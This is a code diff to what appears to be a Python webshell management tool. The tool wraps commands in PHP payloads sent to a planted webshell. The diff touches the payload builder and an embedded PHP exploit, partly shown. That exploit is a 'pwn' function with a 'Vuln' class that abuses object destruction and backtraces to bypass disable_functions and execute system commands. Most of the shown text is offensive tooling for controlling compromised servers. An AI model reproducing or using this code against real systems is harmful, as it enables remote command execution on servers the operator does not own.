@@ -87,7 +87,7 @@ def send(data: str, raw: bool = False, **extra_params):
         params_dict["data"] = {}
     head = randstr(offset)
     tail = randstr(offset)
-    pwd_b64 = b64encode(gget("webshell.pwd", "webshell").encode()).decode()
+    pwd_b64 = b64encode(gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
     if not raw:
         data = f"""error_reporting(0);chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
         if (gget("webshell.bypass_obd", "webshell")):
@@ -191,15 +191,15 @@ def get_system_code(command: str, print_result: bool = True):
             return SYSTEM_TEMPLATE % (base64_encode(command)) + "print($o);"
         else:
             return SYSTEM_TEMPLATE % (base64_encode(command))
-    elif (gget("webshell.bypass_df")):
+    elif (gget("webshell.bypass_df", "webshell")):
         return """pwn(base64_decode("%s"));
 function pwn($cmd) {
     global $abc, $helper, $backtrace;
 
     class Vuln {
         public $a;
-        public function __destruct() { 
-            global $backtrace; 
+        public function __destruct() {
+            global $backtrace;
             unset($this->a);
             $backtrace = (new Exception)->getTrace(); # ;)
             if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
@@ -397,6 +397,8 @@ function pwn($cmd) {
     ob_end_clean();
     %s
 }""" % (base64_encode(command), ("print($o);" if print_result else ""))
+    else:
+        return """print("No system execute function!\\n")"""
 
 
 def is_windows(remote: bool = True):
